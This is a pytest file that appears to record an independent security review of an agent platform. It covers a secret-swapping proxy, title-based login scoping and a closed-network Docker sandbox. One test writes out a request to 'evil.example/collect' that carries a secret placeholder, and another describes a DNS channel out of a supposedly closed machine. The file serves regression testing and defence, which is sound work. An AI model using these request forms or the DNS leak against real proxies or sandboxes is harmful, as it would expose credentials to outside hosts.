"""Independent review, 2026-11-19: the app secrets swap, the closed network, and environment logins.

Each test is a repro of one finding, marked xfail(strict=True) with its id: the fix flips it."""

from __future__ import annotations

import re
import secrets
import shutil
import subprocess
from pathlib import Path
from typing import ClassVar

import h11
import pytest

from agentos.environments.swap import Binding, swap_request
from agentos.vault.policy import env_scope_allows

HOST = "api.bound.example"
PH = "agentos-secret-" + "a" * 32
REAL = "sk-real-value"


async def _resolve(_b, _host):
    return REAL


async def test_n2_absolute_form_target_to_another_host_is_not_swapped():
    # RFC 9112 3.2.2: a server that gets an absolute-form target MUST use its authority and ignore Host.
    # A shared front (a CDN) of the bound host then routes this request, with the real key, to evil.example.
    req = h11.Request(method="GET", target=f"https://evil.example/collect?key={PH}",
                      headers=[("host", HOST)])
    out = await swap_request(req, sni=HOST, bindings=[Binding("K", (HOST,), PH)], resolve=_resolve)
    assert REAL.encode() not in out.request.target, "the real value went into a target naming evil.example"


async def test_n2_absolute_form_naming_the_bound_host_is_swapped_in_origin_form():
    req = h11.Request(method="GET", target=f"https://{HOST}:443/v1?key={PH}", headers=[("host", HOST)])
    out = await swap_request(req, sni=HOST, bindings=[Binding("K", (HOST,), PH)], resolve=_resolve)
    assert out.request.target == f"/v1?key={REAL}".encode()
    for target in (f"https://user@{HOST}/v1?key={PH}", f"{HOST}:443", "*"):
        req = h11.Request(method="GET", target=target, headers=[("host", HOST), ("x-key", PH)])
        out = await swap_request(req, sni=HOST, bindings=[Binding("K", (HOST,), PH)], resolve=_resolve)
        assert REAL.encode() not in out.request.target + b"".join(v for _k, v in out.request.headers)
        assert out.elsewhere == ["K"]


async def test_n2_control_origin_form_is_swapped():
    req = h11.Request(method="GET", target=f"/v1?key={PH}", headers=[("host", HOST)])
    out = await swap_request(req, sni=HOST, bindings=[Binding("K", (HOST,), PH)], resolve=_resolve)
    assert REAL.encode() in out.request.target


def test_n3_a_title_binding_is_not_reachable_by_another_family_choosing_the_title():
    # The binding records the grant family whose computer had the title when the owner bound it
    # (agentos.environments.logins.title_scope), and lane_facts gives each lane's family: the title is the
    # opener's free choice (environment_open(title=...)), so it alone reaches nothing.
    class Entry:
        config: ClassVar[dict] = {"envs": {"scopes": [{"title": "Shop fix", "family": "g-owners-agent"}]}}

    owner_family_env = {"title": "Shop fix", "repo": "github.com/me/shop", "family": "g-owners-agent"}
    other_family_env = {"title": "shop   FIX", "repo": None, "family": "g-other"}   # another grant, its own machine
    no_family = {"title": "Shop fix", "repo": None}
    assert env_scope_allows(Entry(), "env/e1-browser", owner_family_env)
    assert not env_scope_allows(Entry(), "env/e2-browser", other_family_env)
    assert not env_scope_allows(Entry(), "env/e3-browser", no_family)

    class Unbound:  # a title binding made before bindings named the family: it covers no computer
        config: ClassVar[dict] = {"envs": {"scopes": [{"title": "Shop fix"}]}}

    assert not env_scope_allows(Unbound(), "env/e1-browser", owner_family_env)


ENTRYPOINT = Path(__file__).resolve().parents[2] / "deploy" / "environments" / "entrypoint.sh"


def _docker_ready() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        out = subprocess.run(["docker", "image", "inspect", "agentos-env:latest"], capture_output=True, timeout=20, check=False)
    except (OSError, subprocess.TimeoutExpired):
        return False
    return out.returncode == 0


@pytest.mark.skipif(not _docker_ready(), reason="needs Docker and the agentos-env:latest image")
def test_n1_closed_docker_machine_has_no_dns(tmp_path):
    # The entrypoint's own closed() function, run as the docker provider runs it (NET_ADMIN, user network).
    text = ENTRYPOINT.read_text()
    closed = re.search(r"^closed\(\) \{.*?^\}", text, re.DOTALL | re.MULTILINE)
    assert closed is not None
    probe = tmp_path / "probe.sh"
    # The name asked is the container's own (Docker's resolver answers it without leaving this computer),
    # so the test reaches no outside host; any name that resolves proves the resolver is reachable, and
    # Docker forwards every other name to the host's resolvers: a DNS channel out of a "none" machine.
    probe.write_text("#!/bin/sh\nset -eu\n" + closed.group(0) + "\nclosed\n"
                     "python3 -c \"import socket,sys; socket.getaddrinfo(sys.argv[1], 22); print('RESOLVED')\" \"$1\"\n")
    probe.chmod(0o755)
    name = "review-dns-" + secrets.token_hex(4)
    subprocess.run(["docker", "network", "create", name], check=True, capture_output=True, timeout=60)
    try:
        res = subprocess.run(["docker", "run", "--rm", "--name", name, "--network", name, "--cap-drop", "ALL",
                              "--cap-add", "NET_ADMIN", "-v", f"{probe}:/probe.sh:ro", "--entrypoint", "/probe.sh",
                              "agentos-env:latest", name], capture_output=True, text=True, timeout=120, check=False)
    finally:
        subprocess.run(["docker", "network", "rm", name], capture_output=True, timeout=60, check=False)
    assert "RESOLVED" not in res.stdout, "a closed machine resolved a name through Docker's embedded DNS"
